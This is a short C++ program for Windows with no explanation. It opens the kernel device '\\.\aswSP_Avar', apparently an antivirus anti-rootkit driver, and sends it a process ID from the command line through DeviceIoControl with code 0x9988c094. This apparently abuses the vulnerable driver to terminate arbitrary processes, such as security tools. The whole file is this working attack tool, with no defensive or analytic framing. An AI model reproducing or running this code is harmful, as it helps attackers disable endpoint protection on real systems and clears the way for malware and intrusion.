#include <iostream>
#include <Windows.h>
int main(int argc, char* argv[])
{
    DWORD ProcessId = atoi(argv[1]);
    DWORD Return;
    HANDLE hDevice = CreateFileA("\\\\.\\aswSP_Avar", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice != INVALID_HANDLE_VALUE)
    {
        BOOL succ = DeviceIoControl(hDevice, 0x9988c094, (LPVOID)&ProcessId, 4, 0x0, 0, &Return, NULL);
    }
   
    return 0;
}
